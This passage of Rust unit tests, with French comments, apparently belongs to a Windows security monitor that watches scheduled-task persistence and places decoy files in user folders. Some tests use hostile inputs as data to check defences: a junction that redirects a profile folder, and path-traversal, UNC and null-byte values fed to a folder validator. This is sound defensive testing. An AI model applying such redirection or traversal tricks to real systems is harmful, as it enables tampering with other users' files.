    let run = |c: &str| E { cle: "Run|p".into(), categorie: "Run".into(), nom: "p".into(), commande: c.into(), ..Default::default() };
    assert_eq!(d(vec![run("a"), run("b")]).len(), 1, "autres catégories : inchangé");
}

/// R7, S106-15 : seule une panne laisse sans conclusion
#[test]
fn taches_verdict_reverification() {
    use crate::persistance::{verdict_reverification as v, Fichier as F};
    assert_eq!(v(0x8007_0002), F::SansTache);
    assert_eq!(v(0x8007_0003), F::SansTache);
    assert_eq!(v(0x8007_007B), F::SansTache, "nom invalide");
    assert_eq!(v(0x8007_0057), F::SansTache, "nom trop long");
    assert_eq!(v(0x8007_0005), F::NonLisible, "accès refusé");
    assert_eq!(v(0x8007_06BA), F::Inconnu, "panne du Planificateur");
    assert_eq!(v(0x8001_0108), F::Inconnu, "objet COM déconnecté");
    assert_eq!(v(0x8004_1321), F::NonLisible, "SCHED_E : image de tâche corrompue");
    use crate::persistance::examiner_dossier_taches as x;
    let d = dossier_taches("nonlisible");
    std::fs::write(d.join("f"), "x").unwrap();
    assert_eq!(x(&d, &bornes_taches(), &mut |_, _| F::NonLisible), [(r"\f".to_string(), "tâche enregistrée non lisible".to_string())]);
    std::fs::remove_dir_all(&d).unwrap();
}

/// Le vrai Planificateur répond ; pas d'incomplet sur un poste ordinaire ; chaque tâche a un chemin
#[test]
fn taches_planificateur_repond() {
    let r = std::thread::spawn(|| {
        let _com = crate::persistance::ComFil::nouveau();
        let mut n = 0usize;
        let l = crate::persistance::lire_taches_planificateur(&mut |c, _, _| {
            assert!(c.starts_with('\\'), "{c}");
            n += 1;
        });
        (l.vus, l.incomplet, n)
    }).join().unwrap();
    assert!(r.1.is_empty() || r.1.iter().all(|q| *q == "définition illisible" || *q == "lecture partielle"), "{:?}", r.1);
    assert!(r.2 > 0, "aucune tâche relevée");
    assert!(r.0.iter().all(|c| *c == c.to_lowercase()), "chemins en minuscules");
}

/// D1 : relevé tronqué puis complet : aucune alerte pour une tâche connue ; une anomalie reste dite en apprentissage (S103-02)
#[test]
fn taches_releve_incomplet_garde_la_reference() {
    use crate::commun::EntreeDemarrage as E;
    use crate::persistance::{comparer, garder_taches_non_vues as g, ANOMALIE_TACHES};
    let incomplet_nom = |x: E| E { anomalie: true, ..x };
    let t = |nom: &str, c: &str| E { cle: format!("Tâche planifiée|{nom}"), categorie: "Tâche planifiée".into(), nom: nom.into(), commande: c.into(), ..Default::default() };
    let connue = t(r"\Microsoft\Connue", "a.exe");
    let reference: std::collections::HashMap<String, E> = [(connue.cle.clone(), connue.clone())].into_iter().collect();
    let incomplet = incomplet_nom(t(r"\(relevé incomplet : éléments)", &format!("{ANOMALIE_TACHES}relevé incomplet")));
    let mut r = vec![incomplet.clone()];
    assert!(g(&reference, &mut r), "incomplet");
    assert!(r.iter().any(|e| e.cle == connue.cle), "tâche connue gardée");
    let mut complet = vec![connue.clone()];
    assert!(!g(&reference, &mut complet));
    let mut sans = Vec::new();
    assert!(!g(&reference, &mut sans), "relevé complet : une tâche disparue sort");
    assert!(sans.is_empty());
    // Une anomalie autre qu'un relevé incomplet ne garde rien
    let mut lien = vec![incomplet_nom(t(r"\boucle", &format!("{ANOMALIE_TACHES}lien non suivi")))];
    assert!(!g(&reference, &mut lien));
    let (alertes, _) = comparer(&Default::default(), &mut lien, true, &mut Default::default());
    assert_eq!(alertes.len(), 1, "anomalie dite pendant l'apprentissage");
    let mut normale = vec![t(r"\autre", "b.exe")];
    assert!(comparer(&Default::default(), &mut normale, true, &mut Default::default()).0.is_empty(), "le reste s'apprend en silence");
}

/// S103-10 : le premier relevé termine l'apprentissage, même incomplet (`verifier` n'est pas exécutable en test : contrôle du
/// source) ; ensuite une clé Run nouvelle lève PER-001 malgré un relevé des tâches incomplet
#[test]
fn taches_releve_incomplet_laisse_alerter_le_reste() {
    use crate::commun::EntreeDemarrage as E;
    use crate::persistance::{comparer, garder_taches_non_vues, ANOMALIE_TACHES};
    assert!(include_str!("persistance.rs").contains("        self.apprentissage = false;\n") || include_str!("persistance.rs").contains("        self.apprentissage = false;\r\n"));
    let mut r = vec![
        E { anomalie: true, cle: "Tâche planifiée|i".into(), categorie: "Tâche planifiée".into(), nom: r"\(relevé incomplet : éléments)".into(), commande: format!("{ANOMALIE_TACHES}x"), ..Default::default() },
        E { cle: "Run|p".into(), categorie: "Run".into(), nom: "p".into(), commande: "p.exe".into(), ..Default::default() },
    ];
    assert!(garder_taches_non_vues(&Default::default(), &mut r));
    let (alertes, _) = comparer(&Default::default(), &mut r, false, &mut Default::default());
    assert!(alertes.iter().any(|a| a.destination.starts_with("Run")), "clé Run nouvelle signalée");
}

/// S103-06 : hors délai depuis plus de 30 min, le relevé n'est plus « partiel »
#[test]
fn taches_releve_bloque_apres_30_min() {
    use crate::persistance::releve_bloque as b;
    use std::time::Duration as D;
    assert!(!b(None));
    assert!(!b(Some(D::from_secs(1800))));
    assert!(b(Some(D::from_secs(1801))));
    let s = include_str!("moniteur.rs");
    assert!(s.contains("persistance.bloque_depuis_longtemps()"), "collecte non passée indisponible");
    assert!(s.contains("natif::empreinte_a_echeance(chemin)"), "S103-07 : empreinte sous le verrou, sans échéance");
    assert!(include_str!("persistance.rs").contains("l.extend(p.lock().unwrap().iter().cloned());"), "ce qui a été lu est perdu");
    let n = include_str!("natif.rs");
    assert!(n.contains("signataire_a_echeance(chemin).ok().flatten()"), "lecture sans échéance");
    assert!(s.contains("blocage::empreinte_hosts_lue().and_then("), "S104-02 : hosts sans échéance");
    assert!(include_str!("hygiene.rs").contains("lecture_fichier(\"leurre\""), "S104-02 : leurres sans échéance");
    assert!(include_str!("reponse.rs").contains("garde_critique(natif::binaire_windows_lu(chemin))"), "S104-01 : garde sans décision testée");
    let a = include_str!("apprentissage.rs");
    assert!(a.contains("let Ok(lue) = crate::natif::signataire_a_echeance(chemin) else { return \"non signé\".into() };"), "D2 : hors délai en cache");
    assert!(include_str!("vol_donnees.rs").contains("let Ok(s) = crate::natif::signataire_a_echeance(chemin) else { return None };"), "D2 : hors délai en cache");
}

fn lecture_lente(ms: u64, valeur: &str) -> impl FnOnce() -> Option<String> + Send + 'static {
    let v = valeur.to_string();
    move || {
        std::thread::sleep(std::time::Duration::from_millis(ms));
        Some(v)
    }
}

/// S103-07, relecture de #104, D2 et D3 : une lecture par clé, résultat tardif gardé, plafond de lectures
#[test]
fn lecteur_une_lecture_par_cle_et_resultat_tardif() {
    use crate::natif::{HorsDelai, Lecteur};
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::time::Duration as D;
    let l = Lecteur::nouveau(2, D::from_millis(30), D::from_secs(60), D::from_secs(60));
    assert_eq!(l.lire("a", lecture_lente(300, "tard")), Err(HorsDelai));
    static RELANCE: AtomicBool = AtomicBool::new(false);
    let t = std::time::Instant::now();
    assert_eq!(l.lire("a", || { RELANCE.store(true, Ordering::SeqCst); None }), Err(HorsDelai));
    assert!(t.elapsed() < D::from_millis(25), "en cours : réponse immédiate, sans attendre");
    assert!(!RELANCE.load(Ordering::SeqCst), "pas de seconde lecture sur la même clé");
    assert_eq!(l.lire("b", lecture_lente(300, "b")), Err(HorsDelai));
    let t = std::time::Instant::now();
    assert_eq!(l.lire("c", || Some("c".into())), Err(HorsDelai), "plafond atteint");
    assert!(t.elapsed() < D::from_millis(25));
    std::thread::sleep(D::from_millis(500));
    assert_eq!(l.lire("a", || None), Ok(Some("tard".to_string())), "résultat tardif pris au prochain appel");
    assert_eq!(l.lire("c", || Some("c".into())), Ok(Some("c".to_string())), "plafond redescendu");
}

/// D3 : le budget d'attente borne le retard, quel que soit le nombre de fichiers
#[test]
fn lecteur_budget_d_attente() {
    use crate::natif::Lecteur;
    use std::time::Duration as D;
    let l = Lecteur::nouveau(50, D::from_millis(100), D::from_millis(250), D::from_secs(60));
    let t = std::time::Instant::now();
    for i in 0..20 {
        assert!(l.lire(&format!("f{i}"), lecture_lente(800, "x")).is_err());
    }
    assert!(t.elapsed() < D::from_millis(600), "attente bornée par le budget : {:?}", t.elapsed());
    assert!(t.elapsed() >= D::from_millis(200), "le budget est bien attendu : {:?}", t.elapsed());
    // Fenêtre écoulée : le budget repart, sinon toute première lecture répondrait « hors délai » pour toujours
    let l = Lecteur::nouveau(50, D::from_millis(300), D::from_millis(50), D::from_millis(100));
    assert!(l.lire("a", lecture_lente(800, "x")).is_err(), "budget consommé");
    std::thread::sleep(D::from_millis(150));
    assert_eq!(l.lire("b", lecture_lente(10, "b")), Ok(Some("b".to_string())), "budget reparti");
}

/// S104-01 : hors délai, un chemin critique reste protégé ; D1 : `binaire_windows` ne fait pas confiance
#[test]
fn garde_critique_fermee_hors_delai() {
    use crate::natif::{decision_binaire_windows as d, HorsDelai};
    use crate::reponse::garde_critique;
    assert!(garde_critique(Err(HorsDelai)));
    assert!(garde_critique(Ok(true)));
    assert!(!garde_critique(Ok(false)));
    assert_eq!(d(Err(HorsDelai), &|| Ok(true)), Err(HorsDelai));
    assert_eq!(d(Ok(None), &|| Err(HorsDelai)), Err(HorsDelai));
    assert_eq!(d(Ok(Some("Microsoft Windows".into())), &|| Ok(false)), Ok(true));
    assert_eq!(d(Ok(Some("Autre".into())), &|| Ok(false)), Ok(false));
    assert_eq!(d(Ok(None), &|| Ok(true)), Ok(true));
}

/// S103-07 : lecture hors délai : non signé, rien en cache ; la lecture rétablie donne le signataire
#[test]
fn signature_hors_delai_sans_confiance() {
    use crate::moniteur::signataire_cache_avec as s;
    use crate::natif::HorsDelai;
    let exe = std::env::current_exe().unwrap();
    let c = exe.to_string_lossy().to_string();
    let appels = std::cell::Cell::new(0);
    let bloque = |_: &str| { appels.set(appels.get() + 1); Err(HorsDelai) };
    let catalogue = |_: &str| Ok(false);
    let mut cache = std::collections::HashMap::new();
    assert_eq!(s(&mut cache, "", &c, 1000, u64::MAX, &bloque, &catalogue), "");
    assert_eq!(s(&mut cache, "", &c, 1001, u64::MAX, &bloque, &catalogue), "");
    assert_eq!(appels.get(), 2, "pas de cache : le résultat tardif sera pris dès qu'il arrive");
    assert!(!cache.keys().any(|k| k.ends_with("|échec")), "pas d'échec durable");
    // Le hors délai n'est pas un échec définitif : la lecture rétablie donne le signataire, malgré un cache d'échec sans limite
    let lue = |_: &str| Ok(Some("Éditeur".to_string()));
    assert_eq!(s(&mut cache, "", &c, 1600, u64::MAX, &lue, &catalogue), "Éditeur");
}

/// Un seul fil bloqué à la fois ; la garde se libère quand il finit
#[test]
fn avec_echeance_unique_borne_les_fils() {
    use crate::commun::avec_echeance_unique as u;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::time::Duration;
    static GARDE: AtomicBool = AtomicBool::new(false);
    static LANCE: AtomicBool = AtomicBool::new(false);
    assert_eq!(u(&GARDE, Duration::from_millis(20), || std::thread::sleep(Duration::from_millis(400))), None);
    assert_eq!(u(&GARDE, Duration::from_secs(1), || LANCE.store(true, Ordering::SeqCst)), None);
    assert!(!LANCE.load(Ordering::SeqCst), "pas de second fil tant que le premier tourne");
    std::thread::sleep(Duration::from_millis(600));
    assert_eq!(u(&GARDE, Duration::from_secs(5), || 7), Some(7), "garde libérée");
}

#[test]
fn avec_echeance_ne_reste_pas_bloque() {
    use crate::commun::avec_echeance;
    use std::time::{Duration, Instant};
    let t = Instant::now();
    assert_eq!(avec_echeance(Duration::from_millis(50), || std::thread::sleep(Duration::from_secs(5))), None);
    assert!(t.elapsed() < Duration::from_secs(2));
    assert_eq!(avec_echeance(Duration::from_secs(5), || 7), Some(7));
    let s = include_str!("relance.rs");
    assert!(s.contains("avec_echeance(std::time::Duration::from_secs(60), move || ecarter_precree"), "S103-01 : retrait sans échéance");
    let p = include_str!("persistance.rs");
    assert!(p.contains("taches_a_echeance(&mut l);"), "S103-04 : relevé sans échéance");
}

/// D3 : ni adoucie ni apprise ; S103-04 : collecte critique pour SAN-001
#[test]
fn taches_anomalie_signal_fort() {
    let e = crate::commun::EntreeDemarrage {
        categorie: "Tâche planifiée".into(),
        nom: r"\boucle".into(),
        anomalie: true,
        commande: format!("{}lien non suivi", crate::persistance::ANOMALIE_TACHES),
        signataire: "?".into(),
        remarque: crate::persistance::REMARQUE_ANOMALIE_TACHES.into(),
        ..Default::default()
    };
    let a = crate::persistance::alerter(&e, "NOUVEAU démarrage automatique");
    assert_eq!(a.niveau, "Alerte");
    assert!(crate::apprentissage::signal_fort(&a));
    assert!(crate::sante::CRITIQUES.contains(&crate::collectes::Collecte::Persistance));
}

/// Une anomalie du dossier lève au niveau Alerte, quel que soit le nom posé, même sous \Microsoft\Windows
#[test]
fn taches_anomalie_jugee_suspecte() {
    let e = crate::commun::EntreeDemarrage {
        categorie: "Tâche planifiée".into(),
        nom: r"\Microsoft\Windows\boucle".into(),
        anomalie: true,
        commande: format!("{}lien non suivi", crate::persistance::ANOMALIE_TACHES),
        signataire: "?".into(),
        ..Default::default()
    };
    assert!(crate::persistance::evaluer(&e).contains("élément anormal"));
}

/// Jonction (pas besoin d'élévation) `lien` → `cible`
fn jonction(lien: &std::path::Path, cible: &std::path::Path) {
    let s = std::process::Command::new("cmd").args(["/c", "mklink", "/J"]).arg(lien).arg(cible).output().unwrap();
    assert!(s.status.success(), "mklink /J : {}", String::from_utf8_lossy(&s.stderr));
}

/// Revue de sécurité : les leurres sont posés, lus et retirés dans les dossiers de l'utilisateur, qu'il contrôle.
/// Tout passe par un handle ouvert sans suivre de lien, chemin final vérifié : un dossier du profil remplacé par
/// une jonction vers un autre dossier (canari) est refusé, et rien n'y est créé, lu ni supprimé
#[test]
fn leurres_par_handle_jamais_a_travers_un_lien() {
    use crate::hygiene::{creer_leurre, empreinte_verifiee, retirer_leurre};
    let d = dossier_test("leurres-liens");
    let canari = d.join("canari");
    std::fs::create_dir_all(&canari).unwrap();
    std::fs::write(canari.join("0 Factures 1234.docx"), b"fichier du canari").unwrap();
    let avant = contenu_dossier(&canari);
    // Profil piégé : Documents est une jonction vers le canari
    let piege = d.join("piege");
    std::fs::create_dir_all(&piege).unwrap();
    jonction(&piege.join("Documents"), &canari);
    let par_le_lien = piege.join("Documents").join("0 Factures 1234.docx");
    assert!(!retirer_leurre(&par_le_lien), "retrait à travers une jonction : refusé");
    assert!(creer_leurre(&piege.join("Documents").join("0 Nouveau 5678.docx")).is_err(), "création à travers une jonction : refusée");
    assert!(empreinte_verifiee(&par_le_lien).is_none(), "lecture à travers une jonction : refusée");
    assert_eq!(contenu_dossier(&canari), avant, "canari modifié");
    assert_eq!(std::fs::read(canari.join("0 Factures 1234.docx")).unwrap(), b"fichier du canari");
    // Témoin : vrai dossier, tout fonctionne
    let vrai = d.join("vrai").join("Documents");
    std::fs::create_dir_all(&vrai).unwrap();
    let f = vrai.join("0 Contrat 4321.docx");
    creer_leurre(&f).unwrap();
    use std::os::windows::fs::MetadataExt;
    let attributs = std::fs::metadata(&f).unwrap().file_attributes();
    assert_eq!(attributs & 0x6, 0x6, "leurre caché et système");
    assert_eq!(empreinte_verifiee(&f), crate::hygiene::empreinte_fichier(&f), "empreinte lue par le handle vérifié");
    assert!(creer_leurre(&f).is_err(), "un leurre existant n'est jamais écrasé");
    assert!(retirer_leurre(&f) && !f.exists(), "retrait du vrai leurre");
    let _ = std::fs::remove_dir(piege.join("Documents"));
    let _ = std::fs::remove_dir_all(&d);
}

/// Revue de sécurité : plus aucune opération par chemin sur les leurres (suppression, écriture, attributs, audit
/// posé par PowerShell), ni dans hygiene.rs ni au nettoyage de la désinstallation ; profils lus dans ProfileList
#[test]
fn leurres_aucune_operation_par_chemin() {
    let hygiene = include_str!("hygiene.rs");
    let debut = hygiene.find("// ------------------------------------------------------------ leurres").unwrap_or(0);
    let fin = hygiene.find("// ------------------------------------------------------------ pilotes").unwrap_or(hygiene.len());
    let leurres = &hygiene[debut..fin];
    for interdit in ["fs::write(", "attrib.exe", "Set-Acl", "Get-Acl", ".exists()"] {
        assert!(!leurres.contains(interdit), "hygiene.rs (leurres) : opération par chemin {interdit}");
    }
    // Suppression par chemin admise seulement dans le dossier de données (protégé), jamais dans un profil
    for (i, _) in leurres.match_indices("fs::remove_file(") {
        assert!(leurres[i..].starts_with("fs::remove_file(commun::dossier()"), "hygiene.rs (leurres) : suppression par chemin hors du dossier de données");
    }
    let modeles = &hygiene[hygiene.find("fn retirer_leurres_modeles").unwrap()..debut];
    assert!(!modeles.contains("fs::remove_file(") && !modeles.contains("attrib.exe"), "profils modèles : retrait par chemin");
    let moniteur = include_str!("moniteur.rs");
    assert!(!moniteur.contains("fs::remove_file(&l.chemin)"), "nettoyage : retrait par chemin");
    assert_eq!(crate::hygiene::chemin_image_profil(r"%SystemDrive%\Users\marie", "C:"), std::path::PathBuf::from(r"C:\Users\marie"));
    assert_eq!(crate::hygiene::chemin_image_profil(r"D:\Profils\paul", "C:"), std::path::PathBuf::from(r"D:\Profils\paul"));
}

/// Audit du 2026-11-23, A-7-2 : emplacement réel de Documents, Images et Bureau d'après « User Shell Folders » de
/// l'utilisateur (sauvegarde OneDrive, redirection) ; variables développées avec le profil de CET utilisateur ; chemin
/// réseau, variable inconnue, chemin relatif ou « .. » : refusés (dossier par défaut gardé)
#[test]
fn a7_2_dossier_reel_des_leurres() {
    use crate::hygiene::{resoudre_dossier, DossierLeurre::*};
    use std::path::{Path, PathBuf};
    let profil = Path::new(r"C:\Users\marie");
    let od = Some(r"C:\Users\marie\OneDrive");
    assert_eq!(resoudre_dossier(Some(r"%USERPROFILE%\OneDrive\Documents"), profil, "Documents", None), Redirige(PathBuf::from(r"C:\Users\marie\OneDrive\Documents")));
    assert_eq!(resoudre_dossier(Some(r"%userprofile%\OneDrive\Bureau"), profil, "Desktop", None), Redirige(PathBuf::from(r"C:\Users\marie\OneDrive\Bureau")));
    assert_eq!(resoudre_dossier(Some(r"%OneDrive%\Images"), profil, "Pictures", od), Redirige(PathBuf::from(r"C:\Users\marie\OneDrive\Images")));
    assert!(matches!(resoudre_dossier(Some(r"%OneDrive%\Images"), profil, "Pictures", None), Refuse(_)), "%OneDrive% inconnu : jamais deviné");
    assert_eq!(resoudre_dossier(Some(r"D:\Mes documents"), profil, "Documents", None), Redirige(PathBuf::from(r"D:\Mes documents")));
    assert_eq!(resoudre_dossier(Some("D:/Photos/"), profil, "Pictures", None), Redirige(PathBuf::from(r"D:\Photos")));
    // Valeur absente, vide ou égale au dossier par défaut : dossier par défaut
    for v in [None, Some(""), Some("   "), Some(r"%USERPROFILE%\Documents"), Some(r"c:\users\MARIE\documents\")] {
        assert_eq!(resoudre_dossier(v, profil, "Documents", None), Defaut, "{v:?}");
    }
    // Refusés : partage réseau (le service SYSTEM n'y lit ni n'y écrit jamais), préfixes de périphérique, variables
    // inconnues ou non terminées, chemin relatif, « .. »
    for v in [r"\\serveur\partage\Documents", r"\\?\UNC\serveur\partage\Documents", r"\\?\C:\Users\marie\Documents", r"\\.\C:\Documents",
              "//serveur/partage/Documents", r"%HOMEDRIVE%%HOMEPATH%\Documents", r"%USERPROFILE\Documents", r"Documents", r"C:Documents",
              r"C:\Users\marie\..\paul\Documents", r"%USERPROFILE%\..\paul\Documents", "C:\\Users\\marie\\Doc\u{0}uments"] {
        assert!(matches!(resoudre_dossier(Some(v), profil, "Documents", od), Refuse(_)), "{v}");
    }
    // %OneDrive% lui-même réseau : refusé
    assert!(matches!(resoudre_dossier(Some(r"%OneDrive%\Images"), profil, "Pictures", Some(r"\\nas\onedrive")), Refuse(_)));
    torturer_texte(r"%USERPROFILE%\OneDrive\%OneDrive%\Documents", &mut |t| { let _ = resoudre_dossier(Some(t), profil, "Documents", od); });
    torturer_texte(r"%OneDrive%\Documents", &mut |t| { let _ = resoudre_dossier(Some(r"%OneDrive%\Documents"), profil, "Documents", Some(t)); });
}

/// A-7-2 et S268-01 : destination résolue hors du profil admise seulement sur un lecteur local fixe (DRIVE_FIXED, 3) jugé
/// par SYSTEM (lettre inconnue pour lui : refus) et dans un dossier dont l'utilisateur est propriétaire ; sous le
/// profil, toujours (la création reste par handle, chemin final vérifié)
#[test]
fn a7_2_destination_des_leurres_admise() {
    use crate::hygiene::destination_admise;
    use std::path::Path;
    let profil = Path::new(r"C:\Users\marie");
    let sid = "S-1-5-21-1-2-3-1001";
    let jamais = |_: &str| -> u32 { panic!("type de lecteur demandé pour un dossier du profil") };
    let personne = |_: &Path| -> Option<String> { panic!("propriétaire demandé pour un dossier du profil") };
    let a_elle = |_: &Path| Some("s-1-5-21-1-2-3-1001".to_string());
    assert!(destination_admise(Path::new(r"C:\Users\marie\OneDrive\Documents"), profil, sid, &jamais, &personne).is_ok());
    assert!(destination_admise(Path::new(r"c:\users\MARIE\OneDrive\Documents"), profil, sid, &jamais, &personne).is_ok());
    let fixe_d = |r: &str| if r.eq_ignore_ascii_case(r"D:\") { 3 } else { 0 };
    assert!(destination_admise(Path::new(r"D:\Documents"), profil, sid, &fixe_d, &a_elle).is_ok());
    // Lecteur fixe, mais dossier d'un autre propriétaire (dossier partagé inscriptible), propriétaire illisible, SID vide
    for p in [Some("S-1-5-32-544"), Some("S-1-5-21-1-2-3-1002"), None] {
        assert!(destination_admise(Path::new(r"D:\Commun"), profil, sid, &fixe_d, &|_: &Path| p.map(String::from)).is_err(), "{p:?}");
    }
    assert!(destination_admise(Path::new(r"D:\Documents"), profil, "", &fixe_d, &|_: &Path| Some(String::new())).is_err());
    // Lettre inconnue pour SYSTEM (lecteur mappé ou SUBST de la session : 1), amovible, réseau, CD, disque en mémoire
    for t in [0, 1, 2, 4, 5, 6] {
        assert!(destination_admise(Path::new(r"E:\Documents"), profil, sid, &|_: &str| t, &a_elle).is_err(), "type {t}");
    }
    // Préfixe trompeur : un autre profil n'est pas « sous le profil »
    assert!(destination_admise(Path::new(r"C:\Users\marie2\Documents"), profil, sid, &|_: &str| 2, &a_elle).is_err());
}

/// S268-01 : un leurre existant qui a plus d'un nom (lien dur vers un autre fichier) n'est ni audité ni suivi ; nombre
/// de liens lu par handle (essai sur un vrai lien dur) ; aucun nom de leurre dans journal.txt
#[test]
fn s268_01_leurre_lien_dur_refuse() {
    use crate::hygiene::leurre_existant_admis;
    assert!(leurre_existant_admis(Some(1)));
    for l in [None, Some(0), Some(2), Some(1024)] {
        assert!(!leurre_existant_admis(l), "{l:?}");
    }
    let d = dossier_test("leurre-lien-dur");
    let cible = d.join("cible.log");
    std::fs::write(&cible, b"fichier vise").unwrap();
    let leurre = d.join("0 Factures 1234.docx");
    let lire = |p: &std::path::Path| crate::natif::ouvrir_verifie(p, 0x80 | 0x0010_0000, 0x7, false).ok().and_then(|f| crate::natif::nombre_de_liens(&f));
    assert_eq!(lire(&cible), Some(1));
    std::fs::hard_link(&cible, &leurre).unwrap();
    assert_eq!(lire(&leurre), Some(2));
    assert!(!leurre_existant_admis(lire(&leurre)), "lien dur au nom d'un leurre : refusé");
    let _ = std::fs::remove_dir_all(&d);
    let h = include_str!("hygiene.rs").replace("\r\n", "\n");
    let p = &h[h.find("let noms = noms_leurres();").unwrap()..];
    let p = &p[..p.find("FICHIER_LEURRES, &liste").unwrap()];
    assert!(p.contains("let e = match poser_a_echeance(&f)") && !p.contains("poser_audit_verifie"), "liens contrôlés dans la pose sur un seul handle");
    let t = crate::hygiene::sans_profil(r"leurres : C:\Users\marie\OneDrive\Documents\0 Factures 1234.docx refusé (D:\Marie\0 FACTURES 1234.docx)",
        std::path::Path::new(r"C:\Users\marie"), std::path::Path::new(r"D:\Marie"), "0 Factures 1234.docx");
    assert!(!t.to_lowercase().contains("factures") && !t.to_lowercase().contains("marie"), "{t}");
}

/// S268-02 : au plus ANCIENS_MAX anciens emplacements suivis par profil et par leurre, les plus récents (en tête de liste)
#[test]
fn s268_02_anciens_emplacements_bornes() {
    use crate::hygiene::{borner_anciens, Leurre, ANCIENS_MAX};
    let l = |sid: &str, c: &str| Leurre { chemin: c.into(), empreinte: "e".into(), sid: sid.into() };
    let mut anciens: Vec<Leurre> = (0..5).map(|i| l("S-1-5-21-1", &format!(r"C:\D{i}\0 Devis 1234.docx"))).collect();
    anciens.push(l("S-1-5-21-1", r"C:\D9\0 IMG_5555.jpg"));
    anciens.push(l("S-1-5-21-2", r"C:\D9\0 Devis 1234.docx"));
    let (gardes, en_trop) = borner_anciens(anciens, ANCIENS_MAX);
    assert_eq!(ANCIENS_MAX, 3);
    assert_eq!(gardes.len(), 5, "3 du même leurre, plus un autre leurre et un autre profil");
    assert_eq!(en_trop.iter().map(|x| x.chemin.as_str()).collect::<Vec<_>>(), [r"C:\D3\0 Devis 1234.docx", r"C:\D4\0 Devis 1234.docx"]);
    assert!(gardes.iter().any(|x| x.chemin == r"C:\D0\0 Devis 1234.docx"), "le plus récent gardé");
}

/// S268-04 : nombre de liens, audit et empreinte sur UN SEUL handle (aucune réouverture par chemin entre le contrôle et
/// la pose de la SACL) ; issue transportée en texte par le lecteur à échéance, texte inattendu = illisible
#[test]
fn s268_04_pose_sur_un_seul_handle() {
    use crate::hygiene::{issue_pose, IssuePose};
    for i in [IssuePose::Suivi { empreinte: "ab".into(), audit: None }, IssuePose::Suivi { empreinte: "ab".into(), audit: Some("refus".into()) },
              IssuePose::Liens(Some(2)), IssuePose::Liens(None), IssuePose::Illisible] {
        let t = serde_json::to_string(&i).unwrap();
        assert_eq!(issue_pose(Some(&t)), i);
    }
    for t in [None, Some(""), Some("{"), Some(r#"{"Suivi":{"empreinte":3}}"#), Some("\"Autre\"")] {
        assert_eq!(issue_pose(t), IssuePose::Illisible, "{t:?}");
    }
    torturer_texte(r#"{"Suivi":{"empreinte":"ab","audit":null}}"#, &mut |t| { let _ = issue_pose(Some(t)); });
    // Câblage : la pose n'ouvre le leurre qu'une fois (poser_audit_par_handle) ; le contrôle des liens et l'empreinte
    // passent par ce handle
    let h = include_str!("hygiene.rs").replace("\r\n", "\n");
    let q = &h[h.find("fn poser_a_echeance(").unwrap()..];
    let q = &q[..q.find("\n}\n").unwrap()];
    assert_eq!(q.matches("poser_audit_par_handle(").count(), 1);
    assert!(q.contains("crate::natif::nombre_de_liens(h)") && q.contains("leurre_existant_admis(n)") && q.contains("empreinte_lue"), "{q}");
    assert!(!q.contains("ouvrir_verifie") && !q.contains("empreinte_verifiee") && !q.contains("liens_a_echeance"), "réouverture par chemin");
    let p = &h[h.find("let noms = noms_leurres();").unwrap()..];
    let p = &p[..p.find("FICHIER_LEURRES, &liste").unwrap()];
    let boucle = &p[..p.find("// Leurres d'un ancien emplacement").unwrap()];
    assert!(!boucle.contains("poser_audit_verifie") && !boucle.contains("liens_a_echeance(&f)") && boucle.matches("empreinte_a_echeance(&f)").count() == 1,
            "un seul contrôle de présence, puis la pose sur un seul handle");
    let n = include_str!("natif.rs").replace("\r\n", "\n");
    let a = &n[n.find("pub fn poser_audit_par_handle<").unwrap()..];
    let a = &a[..a.find("\n}\n").unwrap()];
    assert_eq!(a.matches("ouvrir_verifie(").count(), 1, "une seule ouverture");
    assert!(a.find("avant(&f)").unwrap() < a.find("poser_sacl(&f").unwrap() && a.find("poser_sacl(&f").unwrap() < a.find("apres(&mut f)").unwrap(),
            "contrôle, puis audit, puis lecture, sur le même handle");
}

/// S268-05 : un ancien emplacement repasse le contrôle des liens (un seul nom ou lecture hors délai : gardé ; absent :
/// oublié ; plusieurs noms : suivi abandonné, journalisé)
#[test]
fn s268_05_anciens_emplacements_controle_des_liens() {
    use crate::hygiene::{suite_ancien, SuiteAncien};
    use crate::natif::HorsDelai;
    assert_eq!(suite_ancien(Ok(Some(1))), SuiteAncien::Garder);
    assert_eq!(suite_ancien(Err(HorsDelai)), SuiteAncien::Garder);
    assert_eq!(suite_ancien(Ok(None)), SuiteAncien::Oublier);
    for n in [0, 2, 7] {
        assert_eq!(suite_ancien(Ok(Some(n))), SuiteAncien::Abandonner, "{n}");
    }
    let h = include_str!("hygiene.rs").replace("\r\n", "\n");
    let p = &h[h.find("// Leurres d'un ancien emplacement").unwrap()..];
    let p = &p[..p.find("borner_anciens(").unwrap()];
    assert!(p.contains("suite_ancien(liens_a_echeance(Path::new(&p.chemin)))") && p.contains("SuiteAncien::Abandonner => commun::journal("));
}

/// A-7-2 : bilan de la pose publié dans l'état de santé (« n posés sur m attendus ») ; une création en échec dans un
/// profil ouvert rend la collecte partielle ; aucun leurre suivi : indisponible ; sinon active (scénario 3a)
#[test]
fn a7_2_bilan_des_leurres() {
    use crate::collectes::Note;
    use crate::hygiene::BilanLeurres;
    let b = BilanLeurres { poses: 3, attendus: 3, ..Default::default() };
    assert_eq!(b.note(1), Note::Active);
    assert_eq!(b.texte(), "leurres : 3 posés sur 3 attendus");
    let b = BilanLeurres { poses: 2, attendus: 6, echecs: 1, sans_session: 1, refus: 1 };
    assert_eq!(b.note(2), Note::Partielle);
    let t = b.texte();
    assert!(t.starts_with("leurres : 2 posés sur 6 attendus") && t.contains("1 en échec") && t.contains("1 profil(s) sans session")
            && t.contains("1 dossier(s) redirigé(s) refusé(s)"), "{t}");
    assert_eq!(BilanLeurres { poses: 0, attendus: 3, ..Default::default() }.note(0), Note::Indisponible);
    // Leurres déjà suivis (pose précédente) sans nouvelle pose : la collecte reste lue
    assert_eq!(BilanLeurres::default().note(3), Note::Active);
}

/// A-7-2 : un leurre resté dans un ancien dossier (dossier redirigé ensuite) reste suivi tant qu'il existe, donc retiré
/// à la désinstallation ; le retrait se fait sous l'identité du propriétaire mémorisée avec le leurre
#[test]
fn a7_2_anciens_leurres_suivis_et_retires() {
    use crate::hygiene::{precedents_hors_cibles, Leurre};
    let l = |c: &str| Leurre { chemin: c.into(), empreinte: "e".into(), sid: "S-1-5-21-1-2-3-1001".into() };
    let precedents = vec![l(r"C:\Users\marie\Documents\0 Devis 1234.docx"), l(r"C:\Users\marie\OneDrive\Documents\0 Devis 1234.docx")];
